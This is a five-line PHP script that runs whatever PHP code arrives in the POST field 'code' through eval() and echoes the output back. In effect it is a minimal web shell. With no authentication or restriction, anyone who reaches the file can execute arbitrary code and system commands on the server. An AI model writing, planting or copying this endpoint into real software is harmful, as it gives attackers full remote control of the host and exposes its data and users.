<?php
ob_start();
eval($_POST['code'] ?? '');
$output = ob_get_clean();
echo $output;